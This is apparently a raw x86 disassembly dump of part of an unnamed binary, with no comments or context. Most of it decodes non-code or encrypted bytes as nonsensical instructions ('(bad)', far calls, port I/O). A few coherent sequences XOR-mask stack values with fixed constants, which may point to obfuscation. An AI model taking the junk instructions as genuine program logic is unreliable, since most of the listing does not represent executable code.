  421386:	fisub  DWORD PTR [ebx+0x1b]
  421389:	out    0xcf,eax
  42138b:	push   esp
  42138c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42138d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42138e:	lds    ebx,FWORD PTR [esp+ebx*2]
  421391:	mov    edx,0xf1a47d52
  421396:	xchg   ebx,eax
  421397:	lea    eax,[esi+0x42]
  42139a:	xor    DWORD PTR [ebp-0x78],ecx
  42139d:	push   es
  42139e:	cmp    DWORD PTR [edi-0x74c8df38],ebx
  4213a4:	out    0xa6,eax
  4213a6:	fwait
  4213a7:	add    ecx,DWORD PTR [edi]
  4213a9:	fcmovbe st,st(4)
  4213ab:	cmp    ch,BYTE PTR [edi+0x78413f74]
  4213b1:	lds    esp,FWORD PTR [edx+0x15f20fc2]
  4213b7:	xchg   al,bh
  4213b9:	fbstp  TBYTE PTR [ebp+0x7b]
  4213bc:	dec    ecx
  4213bd:	sub    BYTE PTR [esp+edx*8+0x25be4f53],ch
  4213c4:	call   0xbc71:0x590b04ad
  4213cb:	outs   dx,DWORD PTR ds:[esi]
  4213cc:	jecxz  0x4213ab
  4213ce:	cdq    
  4213cf:	pop    esi
  4213d0:	outs   dx,BYTE PTR ds:[esi]
  4213d1:	xlat   BYTE PTR ds:[ebx]
  4213d2:	in     al,0xc4
  4213d4:	rol    DWORD PTR [edi],0xdf
  4213d7:	mov    bh,0x61
  4213d9:	repz out dx,al
  4213db:	xor    al,0x7
  4213dd:	fiadd  DWORD PTR ds:0x4e98c2d7
  4213e3:	mov    ds:0x330d4e67,eax
  4213e8:	mov    cl,0x29
  4213ea:	mov    ah,0xd9
  4213ec:	mov    ecx,ebp
  4213ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213ef:	pop    ebx
  4213f0:	ret    0x1ffe
  4213f3:	cmp    BYTE PTR [edx+eax*8],bl
  4213f6:	bound  ebx,QWORD PTR [ebx]
  4213f8:	leave  
  4213f9:	ficom  DWORD PTR [ebx-0x7c13fb8c]
  4213ff:	xchg   edi,eax
  421400:	retf   0xe1e4
  421403:	and    ah,dl
  421405:	xor    DWORD PTR [edi+ecx*8+0x55],edi
  421409:	xor    BYTE PTR ds:0xe49fd41a,0x3f
  421410:	jl     0x4213b1
  421412:	pop    es
  421413:	test   dl,bl
  421415:	lea    eax,[edi]
  421417:	mov    esp,0x3d0b51e5
  42141c:	js     0x4213d5
  42141e:	and    eax,0x816fde31
  421423:	bnd call 0xb1de3fb3
  421429:	ds call 0x4223e0
  42142f:	or     ebx,eax
  421431:	or     esi,edx
  421433:	movzx  eax,bl
  421436:	push   eax
  421437:	lea    eax,[ebp-0x198]
  42143d:	push   eax
  42143e:	call   0x415a09
  421443:	mov    eax,DWORD PTR [ebp-0x1f0]
  421449:	mov    edx,DWORD PTR [ebp-0x1ec]
  42144f:	xor    eax,0xcb79b576
  421454:	xor    edx,0x9c2b8ae8
  42145a:	mov    cl,0x2
  42145c:	call   0x408bb8
  421461:	mov    esi,eax
  421463:	mov    edi,edx
  421465:	mov    eax,DWORD PTR [ebp-0x1f0]
  42146b:	jmp    0x421852
  421470:	out    0xc8,eax
  421472:	push   esi
  421473:	sub    esi,DWORD PTR [esi-0x44]
  421476:	mov    esp,0xfcb5630c
  42147b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42147c:	xor    ch,BYTE PTR [edx-0x44e0300e]
  421482:	sar    BYTE PTR [esi-0x41413bb6],0x45
  421489:	inc    edi
  42148a:	xchg   edi,eax
  42148b:	ret    
  42148c:	ret    0x8a30
  42148f:	and    ch,BYTE PTR [ecx]
  421491:	mov    eax,0x97d3b707
  421496:	cmp    al,0x9f
  421498:	mov    al,ds:0x3f68992f
  42149d:	or     dh,BYTE PTR [ebx]
  42149f:	out    dx,eax
  4214a0:	int3   
  4214a1:	dec    edx
  4214a2:	jmp    FWORD PTR [ebp+0x61]
  4214a5:	pop    esi
  4214a6:	gs push 0x6a
  4214a9:	aaa    
  4214aa:	mov    ebx,0x6cb20c5b
  4214af:	dec    ecx
  4214b0:	adc    eax,0x85293929
  4214b5:	pop    ds
  4214b6:	mov    cl,0x41
  4214b8:	xor    BYTE PTR [ebx-0xe],al
  4214bb:	in     eax,dx
  4214bc:	cmp    edx,DWORD PTR [edi+0x40]
  4214bf:	cs clc 
  4214c1:	arpl   WORD PTR [edi+edi*1],dx
  4214c4:	(bad)  
  4214c5:	scas   al,BYTE PTR es:[edi]
  4214c6:	or     esp,ecx
  4214c8:	push   ecx
  4214c9:	data16 ja 0x4214f1
  4214cc:	test   BYTE PTR es:[ecx+0x39],dl
  4214d0:	gs cmp cl,bl
  4214d3:	mov    ds:0xa474df88,al
  4214d8:	adc    BYTE PTR [eax-0x1d],dh
  4214db:	loope  0x421507
  4214dd:	mov    eax,ds:0x3123697f
  4214e2:	mov    ch,BYTE PTR [esi+0x51]
  4214e5:	pop    esp
  4214e7:	inc    ebx
  4214e8:	(bad)  
  4214e9:	call   0x2b69:0xd05142ba
  4214f0:	test   eax,0x61a8d5f7
  4214f5:	arpl   WORD PTR [edx],sp
  4214f7:	dec    esi
  4214f8:	fucomp st(6)
  4214fa:	shl    DWORD PTR [eax+0x581a1a0c],1
  421500:	pop    edi
  421501:	pop    ss
  421502:	minps  xmm0,XMMWORD PTR [esi]
  421505:	inc    edx
  421506:	rcl    BYTE PTR [eax],1
  421508:	imul   edx,DWORD PTR [eax-0x6c],0xdbdbafa
  42150f:	fwait
  421510:	out    dx,eax
  421511:	sbb    ebp,eax
  421513:	and    BYTE PTR [ebx+eiz*8-0x80],0x77
  421518:	int    0xb
  42151a:	inc    ebx
  42151b:	and    bh,BYTE PTR [esi+0x26b3cac5]
  421521:	cmp    bh,ah
  421523:	push   es
  421524:	push   cs
  421525:	popa   
  421526:	dec    edx
  421527:	int3   
  421528:	lea    esi,ds:0xfdfbd12a
  42152e:	push   0xffffff84
  421530:	cwde   
  421531:	jmp    0xca65299e
  421536:	(bad)  
  421537:	push   ds
  421538:	das    
  421539:	(bad)  
  42153a:	inc    edx
  42153c:	inc    ebp
  42153d:	clc    
  42153e:	jmp    0xf6d3:0x4d8130ff
  421545:	je     0x42152d
  421547:	sub    bl,cl
  421549:	fimul  DWORD PTR [ecx-0x76]
  42154c:	or     eax,0xe9ce2e0
  421551:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421552:	inc    ecx
  421553:	xchg   ebp,eax
  421554:	cli    
  421555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421556:	out    dx,eax
  421557:	in     al,0x26
  421559:	fst    st(0)
  42155b:	icebp  
  42155c:	lods   eax,DWORD PTR ds:[esi]
  42155d:	mov    dh,0xd8
  42155f:	add    al,0xc5
  421561:	or     eax,0x2cbc88d7
  421566:	pushf  
  421567:	mov    esi,0xa86b9c00
  42156c:	dec    edi
  42156d:	shl    DWORD PTR [ecx],1
  42156f:	test   al,0xf
  421571:	das    
  421572:	sub    bl,BYTE PTR [eax]
  421574:	mov    ebx,ds
  421576:	mov    eax,ds:0x39a40712
  42157b:	in     al,0xfd
  42157d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42157e:	stos   BYTE PTR es:[edi],al
  42157f:	lods   eax,DWORD PTR ds:[esi]
  421580:	lods   eax,DWORD PTR ds:[esi]
  421581:	dec    eax
  421582:	pop    edi
  421583:	add    ebx,DWORD PTR [ebx]
  421585:	inc    ebx
  421586:	push   edx
  421587:	mov    ch,0x5b
  421589:	push   edx
  42158a:	int3   
  42158b:	dec    ebx
  42158c:	push   esi
  42158d:	mov    dl,0x7d
  42158f:	xlat   BYTE PTR ds:[ebx]
  421590:	mov    eax,ds:0x6d6b2233
  421595:	push   0x3b
  421597:	mov    edi,0x588f382e
  42159c:	jmp    0xb075:0xc34f2d6f
  4215a3:	push   ebx
  4215a4:	jmp    0x421531
  4215a6:	jge    0x4215cf
  4215a8:	sub    al,0x2c
  4215aa:	mov    al,0x66
  4215ac:	push   eax
  4215ae:	cmp    eax,0x2517f591
  4215b3:	shr    edx,cl
  4215b5:	int3   
  4215b6:	and    al,0x72
  4215b8:	gs lock adc ebp,0x2d286337
  4215c0:	inc    eax
  4215c1:	sub    al,0x4c
  4215c3:	xor    ah,ah
  4215c5:	pop    ecx
  4215c6:	cmp    al,BYTE PTR [esi]
  4215c8:	or     ecx,edx
  4215ca:	fcom   QWORD PTR [ecx+edi*8+0x45a7c0cc]
  4215d1:	retf   0x287c
  4215d4:	mov    dl,0x96
  4215d6:	add    ah,al
  4215d8:	jbe    0x42156f
  4215da:	mov    ds:0x54de77e6,eax
  4215df:	inc    ecx
  4215e0:	pop    edx
  4215e1:	in     al,0x33
  4215e3:	sbb    al,BYTE PTR [ecx-0x3e]
  4215e6:	inc    ebp
  4215e7:	pusha  
  4215e8:	mov    WORD PTR [ebx-0x1e],fs
  4215eb:	(bad)  
  4215ec:	(bad)  
  4215ee:	add    dl,BYTE PTR [edx-0x42]
  4215f1:	push   ss
  4215f2:	xor    ah,BYTE PTR [ebp+0x6ae6ca15]
  4215f8:	mov    ?,WORD PTR [ebx+esi*4-0x146fb6dd]
  4215ff:	jge    0x421634
  421601:	imul   ax,WORD PTR [ebp-0x484826f0],0xff85
  421609:	jge    0x42164a
  42160b:	cdq    
  42160c:	nop
  42160d:	loope  0x4215e0
  42160f:	les    edx,FWORD PTR [esi+0x1f]
  421612:	dec    edx
  421613:	mov    ch,0x12
  421615:	out    dx,eax
  421616:	cmp    eax,0xe516c274
  42161b:	dec    edi
  42161c:	cli    
  42161d:	adc    BYTE PTR [edx+0x23],dl
  421620:	aaa    
  421621:	sar    BYTE PTR [esp+eiz*4-0x4cb6c244],1
  421628:	rol    DWORD PTR ds:0x8b8b086e,1
  42162e:	fisttp WORD PTR [ebp+0x2c]
  421631:	or     esi,DWORD PTR [edi]
  421633:	sbb    DWORD PTR [ebx+0x4fd96a9e],ebp
  421639:	sub    BYTE PTR [edi+0x4a1c84bd],ch
  42163f:	es je  0x421632
  421642:	jns    0x4215d9
  421644:	or     ah,BYTE PTR [eax]
  421646:	dec    ecx
  421647:	jb     0x421605
  421649:	pop    eax
  42164a:	dec    eax
  42164b:	stos   DWORD PTR es:[edi],eax
  42164c:	int    0x37
  42164e:	mov    al,0xbf
  421650:	pop    edi
  421651:	sti    
  421652:	xlat   BYTE PTR ds:[ebx]
  421653:	mov    ecx,0x9ca6fbbd
  421658:	retf   
  421659:	and    al,0x9c
  42165b:	push   eax
  42165c:	add    ebp,ebx
  42165e:	in     eax,dx
  42165f:	mov    dl,0xca
  421661:	sub    edi,DWORD PTR [ecx+0x61b88a4e]
  421667:	outs   dx,BYTE PTR ds:[esi]
  421668:	xor    dl,BYTE PTR [edi+eax*4+0x40]
  42166c:	cmp    ebp,DWORD PTR [esi-0x51]
  42166f:	add    ecx,eax
  421671:	mov    esp,0xf73480ad
  421676:	stos   BYTE PTR es:[edi],al
  421677:	sahf   
  421678:	sbb    al,0xb4
  42167a:	loope  0x421602
  42167c:	std    
  42167d:	fsubr  DWORD PTR [edi]
  42167f:	inc    esp
  421680:	push   cs
  421681:	sub    al,0xf3
  421683:	iret   
  421684:	dec    ebx
  421685:	mov    al,0x8e
  421687:	mov    DWORD PTR ds:0x7b23d85,edx
  42168d:	add    DWORD PTR [ebx+0x34],esi
  421690:	or     bh,BYTE PTR [edi-0x352ee3fd]
  421696:	call   0x9651e0a1
  42169b:	mov    edi,0xfbc2603b
  4216a0:	js     0x421719
  4216a2:	cmp    eax,0xdc6d57e9
  4216a7:	aaa    
  4216a8:	pop    esi
  4216a9:	mov    ah,0xc9
  4216ab:	mov    cl,BYTE PTR [edi+0x49]
  4216ae:	in     eax,0xc0
  4216b0:	adc    al,0xb8
  4216b2:	pushf  
  4216b3:	and    BYTE PTR [ecx+eiz*1+0x3a3b8c18],ch
  4216ba:	lea    eax,[esi]
  4216bc:	cmp    eax,0x6c795c10
  4216c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216c2:	mul    BYTE PTR [eax+0x12]
  4216c5:	inc    ecx
  4216c6:	(bad)  
  4216c7:	lea    esi,[ecx+0x7999e12e]
  4216cd:	scas   eax,DWORD PTR es:[edi]
  4216ce:	mov    ebp,0xdb679911
  4216d3:	adc    bh,BYTE PTR [edi+0x7]
  4216d6:	outs   dx,BYTE PTR ds:[esi]
  4216d7:	lea    esp,[eax-0x78952b4e]
  4216dd:	dec    ecx
  4216de:	loope  0x421667
  4216e0:	add    ecx,DWORD PTR [eax+ecx*8]
  4216e3:	frstor [esi+0x52]
  4216e6:	mov    bl,0xf2
  4216e8:	xchg   esi,eax
  4216e9:	push   eax
  4216ea:	popa   
  4216eb:	outs   dx,BYTE PTR ds:[esi]
  4216ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216ed:	cmp    al,0xaa
  4216f0:	scas   al,BYTE PTR es:[edi]
  4216f1:	jecxz  0x4216aa
  4216f3:	ds inc ebx
  4216f5:	jp     0x421706
  4216f7:	mov    ds:0xd1ecd826,eax
  4216fc:	cmp    al,0x8a
  4216fe:	xchg   DWORD PTR [ecx+0x5fa60dd5],edx
  421704:	lock pop ds
  421706:	or     esi,DWORD PTR [edx]
  421708:	ss push eax
  42170a:	sub    eax,0xa1ef09f4
  42170f:	cmp    DWORD PTR [esi+0x3577eee6],edx
  421715:	jne    0x421705
  421717:	loop   0x4216b1
  421719:	icebp  
  42171a:	mov    ch,0x72
  42171c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42171d:	adc    eax,0xd5ffec52
  421722:	fild   DWORD PTR [ecx+0x41]
  421725:	popa   
  421726:	jp     0x4216c8
  421728:	push   cs
  421729:	test   al,0xf7
  42172b:	call   0x7cd33f34
  421730:	leave  
  421731:	jmp    0x4216e4
  421733:	dec    edi
  421734:	jns    0x421749
  421736:	shl    ebx,cl
  421738:	mov    al,0xa9
  42173a:	fwait
  42173b:	mov    esi,0x5aaec7d4
  421740:	call   0xfdd4:0x5d30e34a
  421747:	cmp    ebp,DWORD PTR [ecx]
  421749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42174a:	xchg   ch,bl
  42174c:	call   0xd9c3598
  421751:	test   BYTE PTR [ebp-0x56],ch
  421754:	icebp  
  421755:	adc    bl,cl
  421757:	add    bl,BYTE PTR [ebp+edi*4+0x283cc88b]
  42175e:	mov    bh,BYTE PTR [esi-0x63f0abaa]
  421764:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421765:	mov    bh,0xdb
  421767:	mov    edx,DWORD PTR [ebp+0x3049163e]
  42176d:	pop    ebp
  42176e:	jmp    0xc207:0xf707f577
  421775:	jno    0x42174a
  421777:	lahf   
  421778:	inc    edx
  421779:	push   esi
  42177a:	mov    eax,0xff96608f
  42177f:	fdiv   st,st(6)
  421781:	inc    esi
  421782:	cdq    
  421783:	push   eax
  421784:	adc    ecx,0x45
  421787:	or     al,0x66
  421789:	push   es
  42178a:	mov    al,ds:0x1718e973
  42178f:	mov    DWORD PTR [edx-0x64],ecx
  421792:	inc    dx
  421794:	sbb    ch,BYTE PTR [edx-0x69c0f821]
  42179a:	les    esp,FWORD PTR [ebx+eiz*4-0x1b]
  42179e:	pusha  
  42179f:	loop   0x421751
  4217a1:	mov    edx,0x4e81b8c6
  4217a6:	stos   DWORD PTR es:[edi],eax
  4217a7:	xor    al,0x20
  4217a9:	stos   BYTE PTR es:[edi],al
  4217aa:	fs jae 0x4217bc
  4217ad:	or     edx,DWORD PTR [ebp-0x4f]
  4217b0:	xor    edi,ecx
  4217b2:	xchg   edx,eax
  4217b3:	cmp    BYTE PTR [eax+0x69],0x5c
  4217b7:	sub    DWORD PTR [edx-0x3abcdcfa],eax
  4217bd:	rcl    BYTE PTR [ebp+0x7e],0x70
  4217c1:	or     BYTE PTR [eax+0x4c],0xb3
  4217c5:	shl    BYTE PTR [edi+esi*8-0x30bff265],0x3
  4217cd:	push   esi
  4217ce:	xchg   edi,eax
  4217cf:	jnp    0x4217e2
  4217d1:	in     eax,0x83
  4217d3:	pop    edi
  4217d4:	(bad)  
  4217d5:	cli    
  4217d6:	fistp  QWORD PTR [ebx+0x293d569e]
  4217dc:	scas   al,BYTE PTR es:[edi]
  4217dd:	or     bh,BYTE PTR [eax-0x2]
  4217e0:	jmp    0xde45def8
  4217e5:	push   ebx
  4217e6:	sub    ebx,DWORD PTR ds:0xf1293eea
  4217ec:	daa    
  4217ed:	std    
  4217ee:	ss xor al,0x36
  4217f1:	shl    BYTE PTR [edx],cl
  4217f3:	loopne 0x4217ab
  4217f5:	neg    bl
  4217f7:	dec    ebx
  4217f8:	icebp  
  4217f9:	mov    eax,DWORD PTR [edx+0x4d016a9a]
  4217ff:	cmp    eax,0x335962ae
  421804:	sub    DWORD PTR [esi+0xe5755e],ebp
  42180a:	mov    ebx,0x3b93402e
  42180f:	aad    0x74
  421811:	je     0x421796
  421813:	or     al,bl
  421815:	mov    ah,BYTE PTR [edx]
  421817:	std    
  421818:	sbb    BYTE PTR [ecx],0xdd
  42181b:	mov    ebx,0x76bc29df
  421820:	and    esi,ebp
  421822:	or     DWORD PTR [ecx],ebp
  421824:	mov    ds:0x6a2e6f50,eax
  421829:	fild   QWORD PTR [eax+eiz*2-0x13de0f37]
  421830:	push   eax
  421831:	inc    esi
  421832:	out    dx,eax
  421833:	pop    edi
  421834:	and    ecx,DWORD PTR [edi+0x23]
  421837:	push   esp
  421838:	sub    DWORD PTR [ecx-0x4d359414],esp
  42183e:	xchg   DWORD PTR [esi+0x28db5417],esi
  421844:	cdq    
  421845:	fs push cs
  421847:	clc    
  421848:	aas    
  421849:	xor    eax,0x1a47c665
  42184e:	loop   0x421845
  421850:	lods   eax,DWORD PTR ds:[esi]
  421851:	dec    ebp
  421852:	mov    edx,DWORD PTR [ebp-0x1ec]
  421858:	xor    eax,0xcb79b576
  42185d:	xor    edx,0x9c2b8ae8
  421863:	mov    cl,0x3e
  421865:	call   0x4223e0
  42186a:	or     esi,eax
  42186c:	or     edi,edx
  42186e:	mov    DWORD PTR [ebp-0x1f8],esi
  421874:	jmp    0x421cb0
  421879:	mov    eax,DWORD PTR [ebp-0x1e0]
  42187f:	mov    edx,DWORD PTR [ebp-0x1dc]
  421885:	xor    eax,0xcb79b576
  42188a:	xor    edx,0x9c2b8ae8
  421890:	mov    cl,0x2
  421892:	call   0x408bb8
  421897:	mov    esi,eax
  421899:	mov    edi,edx
  42189b:	mov    eax,DWORD PTR [ebp-0x1e0]
  4218a1:	mov    edx,DWORD PTR [ebp-0x1dc]
  4218a7:	xor    eax,0xcb79b576
  4218ac:	xor    edx,0x9c2b8ae8
  4218b2:	mov    cl,0x3e
  4218b4:	call   0x4223e0
  4218b9:	or     esi,eax
  4218bb:	or     edi,edx
  4218bd:	jmp    0x421ca4
  4218c2:	sbb    bh,BYTE PTR [esi]
  4218c4:	shr    DWORD PTR [edx+0x6ebaba9a],1
  4218ca:	daa    
  4218cb:	xchg   DWORD PTR [eax-0x2f],ebp
  4218ce:	pop    ecx
  4218cf:	neg    ebx
  4218d1:	jecxz  0x42187f
  4218d3:	rol    eax,0xbe
  4218d6:	dec    edx
  4218d7:	les    edi,FWORD PTR [esi+0x3192e5be]
  4218dd:	xchg   esp,eax
  4218de:	mov    al,ds:0xef4a1ab7
  4218e3:	mov    ch,0x24
  4218e5:	gs jno 0x4218fc
  4218e8:	stos   DWORD PTR es:[edi],eax
  4218e9:	jb     0x4218c6
  4218eb:	lahf   
  4218ec:	shl    DWORD PTR [eax+0xa],cl
  4218ef:	mov    cl,0xc9
  4218f1:	xor    DWORD PTR [eax],ecx
  4218f3:	pushf  
  4218f4:	std    
  4218f5:	call   0x98640681
  4218fa:	xor    al,0xd
  4218fc:	shl    eax,0x32
  4218ff:	fldcw  WORD PTR [esi-0x5be07276]
  421905:	jecxz  0x421960
  421907:	mov    BYTE PTR [edi],cl
  421909:	jbe    0x421964
  42190b:	pop    ebp
  42190c:	dec    ecx
  42190d:	cmp    bl,0x29
  421910:	dec    edi
  421911:	push   ecx
  421912:	push   edx
  421913:	xchg   esi,eax
  421914:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421915:	fsub   DWORD PTR [edx+0x5e]
  421918:	jge    0x42196c
  42191a:	jbe    0x42192a
  42191c:	popa   
  42191d:	out    0x91,eax
  42191f:	sub    eax,0x1c313fc7
  421924:	call   0x40eab5bb
  421929:	mov    ds:0xb99de600,eax
  42192e:	dec    edi
  42192f:	fld    DWORD PTR [ebp-0x7]
  421932:	mov    bl,0x1b
  421934:	mov    dh,0x47
  421936:	dec    esi
  421937:	sar    BYTE PTR [edx+esi*4],1
  42193a:	mov    ds:0x6382358,al
  42193f:	pop    sp
  421941:	xchg   esi,eax
  421942:	inc    ebp
  421943:	sub    DWORD PTR [ecx],edi
  421945:	imul   edx,DWORD PTR ds:0x7547f0a6,0xb496088a
  42194f:	jno    0x4218ec
  421951:	int    0x76
  421953:	mov    edx,0x7eb5a3ab
  421958:	inc    eax
  421959:	xchg   esp,eax
  42195a:	push   0xaeed6f15
  42195f:	je     0x4218f6
  421961:	mov    eax,ds:0xdc11042e
  421966:	daa    
  421967:	rcr    DWORD PTR [ecx-0x63],cl
  42196a:	sbb    eax,DWORD PTR [edi+ecx*8-0xd]
  42196e:	outs   dx,BYTE PTR ds:[esi]
  42196f:	mov    cl,0xea
  421971:	and    cl,cl
  421973:	mov    ah,0xcd
  421975:	daa    
  421976:	pop    esp
  421977:	mov    eax,0x84f8e237
  42197c:	mov    eax,ds:0x1fc86cde
  421981:	push   edi
  421982:	adc    ch,0x95
  421985:	mov    esi,0xca1555f2
  42198a:	cmp    al,ah
  42198c:	and    esi,0xe460d075
  421992:	mov    dh,0x9
  421994:	mov    cl,0x59
  421996:	sar    ch,1
  421998:	mov    ebp,edx
  42199a:	jb     0x42193a
  42199c:	fwait
  42199d:	pop    ebx
  42199e:	inc    ebx
  42199f:	(bad)  
  4219a0:	fbld   TBYTE PTR [edi-0xa]
  4219a3:	mov    dl,0xcd
  4219a5:	imul   ebp,DWORD PTR [esp+ecx*1],0xffffffe9
  4219a9:	addr16 push edi
  4219ab:	mov    esp,0x3bf30b43
  4219b0:	adc    BYTE PTR [eax+0x7b16a398],bh
  4219b6:	or     bl,ah
  4219b8:	dec    esp
  4219b9:	fsub   DWORD PTR [ebp*1+0x700263ff]
  4219c0:	sub    DWORD PTR [ebx-0x1e],ebp
  4219c3:	xlat   BYTE PTR ds:[ebx]
  4219c4:	mov    bl,0xef
  4219c6:	adc    eax,0xd9fe0a91
  4219cb:	aad    0x58
  4219cd:	imul   eax,DWORD PTR ds:0x27ed00e7,0x18c64517
  4219d7:	dec    ebp
  4219d8:	cmp    ch,BYTE PTR [eax-0x23]
  4219db:	cld    
  4219dc:	fwait
  4219dd:	popa   
  4219de:	or     dh,BYTE PTR [ebp+0xa0116c1]
  4219e4:	and    edi,ecx
  4219e6:	(bad)  
  4219e7:	sar    BYTE PTR [edx+esi*4-0x1c39bce2],0x7f
  4219ef:	icebp  
  4219f0:	pushf  
  4219f1:	repz push es
  4219f3:	shl    edi,0x1d
  4219f6:	outs   dx,BYTE PTR ds:[esi]
  4219f7:	sub    BYTE PTR [ebx+0x129d9ee8],dh
  4219fd:	and    ebx,0xffffffad
  421a00:	test   eax,0xc0854bca
  421a05:	pop    eax
  421a06:	jmp    0x568e:0x7d9a036
  421a0d:	inc    ecx
  421a0e:	or     BYTE PTR [edi],dl
  421a10:	push   ebp
  421a11:	out    dx,eax
  421a12:	jle    0x421a67
  421a14:	jae    0x421a02
  421a16:	ror    BYTE PTR [eax],0xd8
  421a19:	ja     0x4219d6
  421a1b:	pop    esp
  421a1c:	inc    ebx
  421a1d:	jmp    0x71ca:0x80398ba0
  421a24:	pop    ebp
  421a25:	add    BYTE PTR [esi-0x15635f76],bl
  421a2b:	mov    ah,0x30
  421a2d:	lea    ebx,[ecx]
  421a2f:	pusha  
  421a30:	icebp  
  421a31:	mov    eax,0xd25f0a46
  421a36:	mov    bl,0xb5
  421a38:	(bad)  [edi+0x35877e5f]
  421a3e:	pop    edx
  421a3f:	cmp    BYTE PTR [esi+0x3],al
  421a42:	xor    DWORD PTR [esi+0x182f165b],esp
  421a48:	push   es
  421a49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a4a:	call   0x7639a83b
  421a4f:	sbb    eax,edi
  421a51:	mov    bh,0xde
  421a53:	mov    al,0x7b
  421a55:	mov    ah,0x68
  421a57:	loope  0x421ac5
  421a59:	mov    esi,ebx
  421a5b:	xchg   al,dl
  421a5d:	xchg   ebp,eax
  421a5e:	jge    0x421ac0
  421a60:	mov    ebx,DWORD PTR [ecx]
  421a62:	pop    ds
  421a63:	mov    BYTE PTR fs:[ecx-0x7a],0x32
  421a68:	mov    dh,0x79
  421a6a:	les    ebp,FWORD PTR [ecx]
  421a6c:	inc    esp
  421a6d:	fnstenv [ebp+0x2e597fd8]
  421a73:	cld    
  421a74:	inc    esp
  421a75:	mov    al,0x1d
  421a77:	gs mov edx,0xbd684c16
  421a7d:	imul   bh
  421a7f:	pop    ds
  421a80:	sahf   
  421a81:	push   ebx
  421a82:	mov    esp,0x4b5d6550
  421a87:	rol    dh,1
  421a89:	pop    esi
  421a8a:	cmp    ebx,DWORD PTR [eax+0x34b958dd]
  421a90:	aam    0x7c
  421a92:	jmp    0xf38979b0
  421a97:	pop    edi
  421a98:	adc    eax,0x6660648e
  421a9d:	stc    
  421a9e:	push   eax
  421a9f:	ret    0x1ed2
  421aa2:	cld    
  421aa3:	call   0xcff6811a
  421aa8:	pop    ebx
  421aa9:	push   ebp
  421aaa:	sub    ch,BYTE PTR [ecx+0xa7659bc]
  421ab0:	fs mov edi,db7
  421ab4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ab5:	adc    eax,0xa61fcde6
  421aba:	lea    ebx,[esi-0x58]
  421abd:	jo     0x421b26
  421abf:	dec    ecx
  421ac0:	std    
  421ac1:	push   es
  421ac2:	dec    ebp
  421ac3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ac4:	push   eax
  421ac5:	scas   eax,DWORD PTR es:[edi]
  421ac6:	lods   al,BYTE PTR ds:[esi]
  421ac7:	stos   BYTE PTR es:[edi],al
  421ac8:	inc    edx
  421ac9:	call   0xf0bed6d0
  421ace:	mov    ebp,0xa53e14e9
  421ad3:	mov    bh,0x47
  421ad5:	push   es
  421ad6:	shl    DWORD PTR [edx],0x40
  421ad9:	es jne 0x421aec
  421adc:	push   esi
  421add:	mov    es,WORD PTR [edx+0x7e]
  421ae0:	ret    
  421ae1:	lods   eax,DWORD PTR ds:[esi]
  421ae2:	rcl    BYTE PTR [esi+edx*1-0xb],cl
  421ae6:	sub    edi,DWORD PTR [edi+0x64]
  421ae9:	jne    0x421b1a
  421aeb:	pop    ebx
  421aec:	(bad)  
  421aed:	pop    ebp
  421aee:	and    ecx,DWORD PTR [edi+0x7d]
  421af1:	xor    BYTE PTR [edi],cl
  421af3:	loopne 0x421b2c
  421af5:	push   ds
  421af6:	int    0x29
  421af8:	inc    esp
  421af9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421afa:	or     edx,DWORD PTR [eax]
  421afc:	mov    ah,0xf0
  421afe:	xchg   BYTE PTR [ecx-0x7f9ec6df],ah
  421b04:	js     0x421b21
  421b06:	xor    eax,0x126d367a
  421b0b:	mov    ecx,0x3dc83bc0
  421b10:	xor    DWORD PTR [esp+ebp*1+0x1814db64],edi
  421b17:	lock imul ebx,DWORD PTR [edx+0x74a8f906],0xffffff8e
  421b1f:	ins    BYTE PTR es:[edi],dx
  421b20:	lods   al,BYTE PTR ds:[esi]
  421b21:	mov    ebx,DWORD PTR [edx+esi*1]
  421b24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b25:	mov    dh,0x6
  421b27:	sahf   
  421b28:	scas   eax,DWORD PTR es:[edi]
  421b29:	fstp   TBYTE PTR [edx-0x3b]
  421b2c:	scas   al,BYTE PTR es:[edi]
  421b2d:	jae    0x421b84
  421b2f:	cmp    ebx,ecx
  421b31:	out    dx,al
  421b32:	es in  eax,dx
  421b34:	cmp    DWORD PTR [eax+edi*8-0x20ff2da4],edx
  421b3b:	mov    ebx,0x65b70052
  421b40:	add    BYTE PTR [ebp+0x61],0xc0
  421b44:	mov    edx,0x43a6eb85
  421b49:	jp     0x421b2c
  421b4b:	lahf   
  421b4c:	add    al,0xe
  421b4e:	cmp    DWORD PTR [eax-0x22abc286],ecx
  421b54:	sbb    bh,BYTE PTR [ebp+0x33]
  421b57:	mov    dh,0xe5
  421b59:	gs pop ss
  421b5b:	scas   al,BYTE PTR es:[edi]
  421b5c:	jae    0x421b41
  421b5e:	scas   eax,DWORD PTR es:[edi]
  421b5f:	ret    0x6aa8
  421b62:	jle    0x421b39
  421b64:	(bad)  es:[eax]
  421b67:	xor    ch,BYTE PTR [esi+0x39]
  421b6a:	cwde   
  421b6b:	push   0x8afc85e2
  421b70:	popa   
  421b71:	adc    ebp,ebp
  421b73:	in     al,dx
  421b74:	cmp    BYTE PTR [edi-0x1],bh
  421b77:	in     eax,dx
  421b78:	test   DWORD PTR ds:[ebx-0x42c0c567],ebp
  421b7f:	xor    eax,0xf885ea24
  421b84:	mov    esp,0x9f01be9a
  421b89:	and    edx,esp
  421b8b:	pop    esp
  421b8c:	cmp    DWORD PTR [esi],ebx
  421b8e:	lds    ebx,FWORD PTR [eax]
  421b90:	xlat   BYTE PTR ds:[ebx]
